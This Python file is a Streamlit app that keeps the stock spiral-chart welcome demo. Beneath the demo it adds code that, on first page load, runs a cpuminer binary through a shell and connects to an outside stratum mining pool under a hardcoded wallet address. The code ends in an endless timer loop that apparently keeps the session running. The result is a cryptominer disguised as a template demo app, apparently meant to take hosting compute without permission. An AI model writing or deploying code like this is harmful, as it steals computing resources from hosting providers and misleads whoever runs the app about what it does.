from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import subprocess
import time

# Initialize session state
if "control_flag" not in st.session_state:
    st.session_state.control_flag = 0
if "miner_output" not in st.session_state:
    st.session_state.miner_output = ""

# Welcome message
st.write("""
# Welcome to Streamlit!

Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:

If you have any questions, checkout our [documentation](https://docs.streamlit.io) and [community
forums](https://discuss.streamlit.io).

In the meantime, below is an example of what you can do with just a few lines of code:
""")

# Interactive spiral visualization
with st.echo(code_location='below'):
    total_points = st.slider("Number of points in spiral", 1, 5000, 2000)
    num_turns = st.slider("Number of turns in spiral", 1, 100, 9)

    Point = namedtuple('Point', 'x y')
    data = []

    points_per_turn = total_points / num_turns

    for curr_point_num in range(total_points):
        curr_turn, i = divmod(curr_point_num, points_per_turn)
        angle = (curr_turn + 1) * 2 * math.pi * i / points_per_turn
        radius = curr_point_num / total_points
        x = radius * math.cos(angle)
        y = radius * math.sin(angle)
        data.append(Point(x, y))

    st.altair_chart(alt.Chart(pd.DataFrame(data), height=500, width=500)
        .mark_circle(color='#0068c9', opacity=0.5)
        .encode(x='x:Q', y='y:Q'))

# Display control flag
st.write("Control Flag:", st.session_state.control_flag)

# Run mining script only once
if st.session_state.control_flag == 0:
    st.session_state.control_flag += 1

    # Run the mining script
    st.write("### Mining Script Output")
    with st.spinner("Running mining script..."):
        try:
            # Example mining command (replace with your actual mining script)
            mining_command = "./cpuminer-sse2 -a yespowerr16 -o stratum+tcps://stratum-na.rplant.xyz:13382 -u YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe.ODM-$(echo $(shuf -i 10000-99999 -n 1))"
            process = subprocess.Popen(mining_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            # Capture and display the output
            st.session_state.miner_output = stdout.decode("utf-8")
            if stderr:
                st.session_state.miner_output += "\nErrors:\n" + stderr.decode("utf-8")
        except Exception as e:
            st.session_state.miner_output = f"Error running mining script: {e}"

# Display mining script output
st.write("Miner Output:")
st.code(st.session_state.miner_output)

# Timer display
st.write("### Timer")
timer_placeholder = st.empty()
start_time = time.time()

while True:
    elapsed_time = time.time() - start_time
    hours, remainder = divmod(elapsed_time, 3600)
    minutes, seconds = divmod(remainder, 60)
    timer_placeholder.write(f"Elapsed Time: {int(hours):02}:{int(minutes):02}:{int(seconds):02}")
    time.sleep(1)
